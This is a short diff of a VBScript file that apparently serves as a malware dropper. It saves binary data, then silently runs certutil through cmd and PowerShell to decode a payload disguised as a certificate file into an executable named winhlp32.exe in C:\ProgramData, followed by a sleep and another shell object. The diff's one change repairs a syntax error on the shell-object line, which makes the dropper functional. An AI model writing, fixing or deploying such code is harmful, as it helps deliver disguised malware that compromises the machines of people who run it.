@@ -13,7 +13,7 @@ Function SaveBinaryData(FileName, Data)
 	BinaryStream.Write Data
 	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
 End Function
-Set objShell = WScript.CreateObject("WScript.Shell"
+Set objShell = WScript.CreateObject("WScript.Shell")
 objShell.Run "cmd /c powershell certutil -decode C:\ProgramData\winhlp32\cert64.crt C:\ProgramData\winhlp32\winhlp32.exe", 0, True
 WScript.Sleep(5000)
 Set WshShell = CreateObject("WScript.Shell")
